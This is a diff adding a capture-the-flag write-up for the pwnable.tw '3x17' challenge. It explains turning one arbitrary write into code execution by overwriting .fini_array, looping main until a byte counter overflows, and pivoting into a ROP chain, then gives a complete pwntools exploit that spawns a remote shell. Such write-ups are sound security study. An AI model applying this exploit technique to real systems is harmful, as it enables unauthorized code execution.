@@ -271,6 +271,8 @@ $ file calc
 calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped
 ```
 
+### Overview
+
 The program allocates buffer of size `0x400` bytes on the stack, which stores the calculator expression. \
 It reads up to `0x400` bytes, one byte at a time. Interesitngly, **there's off-by-one vuln**:
 
@@ -581,4 +583,221 @@ Instead, most of the solutions have used the prefix-operator usage vuln, which I
 
 ## 3x17
 
+```bash
+$ checksec 3x17
+[*] '/home/itay/projects/pwnable_tw/3x17/3x17'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+
+$ file 3x17
+3x17: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped
+```
+
+Finally, 64-bit binary. Stripped though. 
+
+### Overview
+
+The program prompts us, asking for `"addr:"` and `"data:"`. 
+There's also a counter, making sure this is called only once. 
+Notice we can write `0x18` bytes. \
+Hence, the challenge idea is simple (yet challenging) - 
+**having a single arbitrary write, without any leak, obtain RCE.**
+
+Btw, 3x17 is an interesting name for a challenge, and it probably serves as some kind of hint. 
+
+### Exploitation
+
+#### Idea (Failed) - One gadget
+
+The first idea, of course, is to overwrite the counter, as it is placed within
+some constant `.bss` address. However, right after doing so, the program would terminate. \
+The second idea is to use one-gadget. By changing the program's control flow into the one-gadget address 
+(which is known, as the binary is statically linked and no PIE), we would win. \
+So this solves the `data` we would like to write. But which `addr` we would like to write to?
+Because theres no stack leak, I aimed to obtain branch primitive by overwriting a `.fini` handler. \
+Recall how `_start` invokes `main` - it calls `__libc_start_main`, with `main` address as one of its parameters. 
+However, some of the other parameters are the `init, fini` code snippets. 
+In this binary, `0x402960` serves as the destructor code, which would be executed right prior 
+to program's termination, invoking function pointers off `.fini_array`, which is located
+within `0x4b40f0` on our binary, and contains `2` default handlers. \
+So in short, I'll simply execute the following:
+
+```bash
+*_fini_array[0] = one_gadget;
+```
+
+However, upon running one gadget on the static binary, I've noticed it was only compiled with part of its needed libc. \
+Hence, It did not contain the code snippet that usually wrapped within `system`, and there were no references of `/bin/sh`.
+
+#### Idea - .init_array, .fini_array
+
+As mentioned, the `.fini_array` actually contains 2 slots, and our write primitive allows `0x18` linear write. 
+Hence, we can overwrite the 2 handlers that are stored there, making sure `main` would be called once again,
+allowing extra invocation of the write primitive, along with setting the return address. \
+**We can take this approach further** - instead of jumping back to `main`, jump back to `_start`.
+By doing so, we would also first invoke the `.init_array` handlers before executing `main`. 
+This also may explain why overwrite of `0x18` was given within the challenge. 
+The challenge's name may hint there are `3` invocations involved, but not sure why `17` (and not `18`?) though. \
+At this point, I've decided I have to go deeper into the ELF initialization & termination processes, focusing on our
+controlled arrays. The [following great article][elf-start] explains exactly this.
+
+#### __libc_csu_init, __libc_csu_fini
+
+A very good candidates we can set our `.fini_array` entry to. 
+By doing so, it invokes the 2 handlers of the `.init{fini}_array` one after another, without any stack-layout requirement. \
+While it doesn't seem significant, 
+it actually transforms our arbtitrary-single-branch primitive into arbitrary-double-branch primitive. 
+However, we still need to write our shellcode somewhere, make it executable, and jump to it. 
+
+#### Re-execution
+
+To achieve our prerequisites for running the shellcode, we must be able to invoke the write primitive multiple times. 
+Now that we can jump into any 2 addresses we wish (by jumping to the `.init_array` runner routine), we can think of some wacky ideas. \
+For example, setting the second init handler to the same `.init_array` runner routine, while setting the first - to the arbitrary write within `main`. 
+
+**The big obstacle of this challenge, is having the `counter` check within `main`**, hence - invoking main multiple times won't naively work. \ 
+However, the counter is actually saved as a single byte within global variable. 
+By invoking `main` 256 times, integer overflow occurs, and the counter is reset back to `0`. 
+This means that by making an infinite jump trampoline to `main`, we would eventually be able to re-execute the write primitive code!
+
+#### Termination
+
+Right upon invoking the `.fini_array` handlers within `__libc_csu_fini`, 
+`rbp` is always initialized to the `.fini_array` address. 
+
+```bash
+pwndbg> x/10gx $rbp
+0x4b40f0:       0x0000000000402960      0x0000000000401b6d
+0x4b4100:       0x0000000d00000002      0x000000000048f7e0
+```
+
+This means that if we would find `leave ; ret` gadget, we would first load `rbp + 8` to `rsp` (`0x4b40f8` in the example),
+and jump to whatever resides there. \
+Hence, we shall overwrite `.fini_array[0] = leave_gadget`, and `.fini_array[1] = RA`.
+The easiest way to exploit this would probably be a ROP chain, where the above `RA` stands for the first gadget's address.
+
+#### Solution
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+HOST = 'chall.pwnable.tw'
+PORT = 10105
+context.arch='amd64'
+BINARY = './3x17'
+GDB_SCRIPT = '''
+b *0x41e4af
+commands
+    p "Called leave.."
+end
+
+c
+'''
+
+binary_rop = ROP(BINARY)
+
+# Offsets
+
+# Constants
+CHUNK_SIZE = 0x18
+
+# Addresses
+FINI_ARRAY = 0x4b40f0
+MAIN = 0x401b6d
+LIBC_CSU_FINI = 0x402960 
+SHELLCODE_ADDR = 0x4B9C00  # Just random RW memory
+
+pop_rdi_ret = binary_rop.rdi.address
+pop_rsi_ret = binary_rop.rsi.address
+pop_rdx_ret = binary_rop.rdx.address
+pop_rax_ret = binary_rop.rax.address
+leave_ret = binary_rop.find_gadget(['leave']).address
+syscall = binary_rop.find_gadget(['syscall']).address
+log.info(f'pop_rdi_ret: {hex(pop_rdi_ret)}')
+log.info(f'pop_rsi_ret: {hex(pop_rsi_ret)}')
+log.info(f'pop_rdx_ret: {hex(pop_rdx_ret)}')
+log.info(f'pop_rax_ret: {hex(pop_rax_ret)}')
+log.info(f'leave_ret: {hex(leave_ret)}')
+log.info(f'syscall: {hex(syscall)}')
+
+
+def unsigned(n, bitness=32):
+    if n < 0:
+        n = n + 2**bitness
+    return n
+
+def pad(buf, alignment, delimiter=b'\x00'):
+    if (len(buf) % alignment) == 0:
+        return buf
+
+    extra = (alignment - (len(buf) % alignment)) * delimiter
+    return buf + extra
+
+def splitted(buf, n):
+    for i in range(0, len(buf), n):
+        yield buf[i: i + n]
+
+def write(p, addr, data):
+    p.recvuntil(b'addr:')
+    p.sendline(str(addr).encode())
+    p.recvuntil(b'data:')
+    p.send(data)
+
+def exploit(p):
+    buf = b''
+    buf += p64(LIBC_CSU_FINI)       # .fini_array[0] - redo! 
+    buf += p64(MAIN)                # .fini_array[1] - call to main. This would use the counter integer overflow, after 256 times - reseting it back to 0
+    write(p, addr=FINI_ARRAY, data=buf)  # Arbitrary-write enabled!
+
+    rop_buf = p64(leave_ret)
+    rop_buf += p64(pop_rax_ret)
+    rop_buf += p64(0x3b)
+    rop_buf += p64(pop_rsi_ret)
+    rop_buf += p64(0)
+    rop_buf += p64(pop_rdx_ret)
+    rop_buf += p64(0)
+    rop_buf += p64(pop_rdi_ret)
+    rop_buf += p64(FINI_ARRAY + len(rop_buf) + 0x10)
+    rop_buf += p64(syscall)
+    rop_buf += b'/bin/sh\x00'
+
+    write(p, addr=FINI_ARRAY + 3 * CHUNK_SIZE, data=rop_buf[3 * CHUNK_SIZE: 3 * CHUNK_SIZE + 0x10])
+    write(p, addr=FINI_ARRAY + 2 * CHUNK_SIZE, data=rop_buf[2 * CHUNK_SIZE: 3 * CHUNK_SIZE])
+    write(p, addr=FINI_ARRAY + CHUNK_SIZE, data=rop_buf[CHUNK_SIZE: 2 * CHUNK_SIZE])
+    write(p, addr=FINI_ARRAY, data=rop_buf[: CHUNK_SIZE])    
+
+
+def main():
+    is_debug = False
+    is_remote = True
+    if is_debug:
+        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
+    else:
+        if is_remote:
+            p = remote(HOST, PORT)
+        else:
+            p = process(BINARY)
+
+    exploit(p)
+
+    log.info('Win')
+    p.interactive()
+
+if __name__ == '__main__':
+    main()
+```
+
+## dubblesort
+
 TODO
+
+
+
+
+
+[elf-start]: http://www.dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html
